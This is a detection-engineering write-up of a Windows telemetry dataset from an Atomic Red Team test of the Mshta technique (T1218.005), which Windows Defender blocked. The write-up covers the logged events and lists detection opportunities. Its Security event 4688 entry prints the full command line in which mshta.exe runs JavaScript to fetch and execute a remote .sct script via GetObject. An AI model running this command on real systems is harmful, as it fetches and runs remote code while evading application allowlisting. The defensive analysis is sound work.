# T1218.005-1: Mshta — Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject

## Technique Context

T1218.005 (Mshta) is a defense evasion technique where attackers abuse Microsoft's HTML Application Host (mshta.exe) to execute malicious code while bypassing application allowlisting. Mshta.exe is a legitimate Windows utility that executes HTA (HTML Application) files, but can also directly execute JavaScript, VBScript, or retrieve remote payloads. This specific test demonstrates using JavaScript with the GetObject method to fetch and execute a remote .sct (Windows Script Component) file, a common technique for living-off-the-land attacks.

The detection community focuses on mshta.exe command-line analysis, network connections to suspicious domains, script content execution, and process ancestry chains. Since mshta.exe is rarely used legitimately in most environments, any execution warrants investigation.

## What This Dataset Contains

This dataset shows Windows Defender successfully blocking the mshta.exe execution attempt. The key evidence includes:

**Security Event 4688** shows cmd.exe spawning with the complete attack command line: `"cmd.exe" /c mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();`

**Security Event 4689** reveals cmd.exe exiting with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution before mshta.exe could be spawned.

**Sysmon events** capture standard PowerShell test framework activity - two PowerShell processes (PIDs 41868 and 10996) with .NET runtime loading, Windows Defender DLL injections (MpOAV.dll, MpClient.dll), and urlmon.dll loading suggesting network preparation.

**PowerShell logging** contains only test framework boilerplate - Set-StrictMode configurations and Set-ExecutionPolicy Bypass commands, with no actual technique-related script content.

**Process chain**: PowerShell → cmd.exe → [blocked mshta.exe attempt]

## What This Dataset Does Not Contain

This dataset lacks the core mshta.exe execution telemetry because Windows Defender blocked the process creation. Missing elements include:

- No Sysmon ProcessCreate (EID 1) for mshta.exe itself
- No network connections from mshta.exe to the GitHub URL
- No JavaScript engine activity or script execution events
- No file writes of the downloaded .sct payload
- No process injection or code execution from the remote script component

The sysmon-modular configuration's include-mode ProcessCreate filtering explains why we only see whoami.exe creation but not all intermediate processes.

## Assessment

This dataset provides limited detection value for the actual T1218.005 technique since Windows Defender prevented execution. However, it excellently demonstrates endpoint protection blocking behavior and the telemetry available when attacks are stopped at process creation. The Security event logs capture the full attack command line, making this useful for testing detection rules that focus on suspicious mshta.exe command patterns rather than successful execution artifacts.

For complete T1218.005 detection development, you'd need a dataset where the technique executes successfully or Defender is disabled.

## Detection Opportunities Present in This Data

1. **Mshta command line pattern detection** - Security EID 4688 with `cmd.exe` spawning `mshta.exe javascript:` followed by `GetObject('script:http`)
2. **Process creation blocked by security software** - cmd.exe exit status 0xC0000022 combined with mshta.exe in command line
3. **Suspicious parent-child process relationship** - PowerShell spawning cmd.exe with mshta.exe in arguments
4. **Remote script component URL patterns** - Command lines containing `GetObject('script:https://` with .sct file extensions
5. **Windows Defender blocking telemetry correlation** - STATUS_ACCESS_DENIED exit codes with LOLBin command lines for endpoint protection validation
